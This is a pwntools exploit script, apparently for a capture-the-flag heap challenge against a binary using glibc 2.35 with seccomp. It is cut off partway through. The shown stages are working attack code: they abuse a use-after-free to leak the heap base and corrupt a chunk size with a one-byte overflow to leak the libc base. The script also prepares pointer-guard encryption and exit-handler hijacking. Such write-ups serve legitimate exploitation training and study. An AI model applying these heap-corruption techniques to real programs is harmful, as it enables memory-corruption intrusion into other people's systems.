# malloc a chunk of size (0x20-0x40) at index (0-2) and read corresponding bytes of data at most into it (one byte overflow, null terminated)
def add_evidence(slot, length, evidence):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Put into which backpack slot?\n> ", str(slot).encode())
    p.sendlineafter(b"How long is the evidence's description?\n> ", str(length).encode())
    p.sendafter(b"Describe the evidence\n> ", evidence)

# write data of a chunk at index as a string by puts function
def view_evidence(slot):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"View which backpack slot?\n> ", str(slot).encode())
    return p.recvline().strip()

# free a chunk at index, not setting its pointer to NULL (use-after-free vulnerability)
def remove_evidence(slot):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"Remove which backpack slot?\n> ", str(slot).encode())

# exit program through exit(0)
def finish():
    p.sendlineafter(b"> ", b'4')

def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
    r_bits = 0x11
    max_bits = 64
    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
    return encrypted


# syscalls of execve, execveat, fork, vfork, and clone are prohibited by seccomp filter

# available vulnerabilities in glibc 2.35:
# 1. double free into different tcache bins is allowed
# 2. rdx register is loaded with value 1 before each exit function gets called

# usable characteristics of exit function list:
# 1. exit function list is last in first out
# 2. a registered exit function can receive 2 arguments (exit code and user supplied argument), whose order is determined by function's flavor, where flavor 4 (ef_cxa) passes 2 arguments with order (exit code, user supplied argument) while flavor 2 (ef_on) passes 2 arguments with order (user supplied argument, exit code)

glibc_e = ELF('./libc.so.6')

# Stage 1: leak heap base address
# tcache bin of size 0x30 has only 2 chunks, so exploit these 2 chunks to leak heap address
add_evidence(0, 0x28, b'0') # heap_base_addr+0x300
add_evidence(1, 0x28, b'1') # heap_base_addr+0x460
remove_evidence(0) # heap_base_addr+0x300
heap_base_addr = u64(view_evidence(0).ljust(8, b'\x00'))<<12 # heap_base_addr+0x300
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: leak glibc base address
# right after chunk of size 0x30 at heap_base_addr+0x300, chunk of size 0x20 at heap_base_addr+0x330 and chunk of size 0xd0 at heap_base_addr+0x350 are adjacent and have a sum size of 0xf0, so exploit these 3 chunks to leak glibc address
for _ in range(8):
    add_evidence(1, 0x18, b'1') # heap_base_addr+0x330
# overwrite size field of chunk of size 0x20 at heap_base_addr+0x330 to 0xf0 through one byte overflow
add_evidence(0, 0x28, b'0'*0x28+b'\xf1') # heap_base_addr+0x300
# free chunk of fake size 0xf0 at heap_base_addr+0x330 into unsorted bin
remove_evidence(1) # heap_base_addr+0x330
# clear all other 0xf0 size chunks in unsorted bin except chunk at heap_base_addr+0x330 to place a glibc address into first qword of it
for _ in range(25):
    add_evidence(2, 0x28, b'2')
glibc_base_addr = u64(view_evidence(1).ljust(8, b'\x00'))-0x21adc0 # heap_base_addr+0x330
log.info(f"glibc base address: {hex(glibc_base_addr)}")
tls_base_addr = glibc_base_addr-0x28c0

# Stage 3: clear freed chunks in bins generated by seccomp filter
# clear tcache bin and fastbin of size 0x20
for _ in range(11):
    add_evidence(2, 0x18, b'2')
# clear unsorted bin of size 0x30
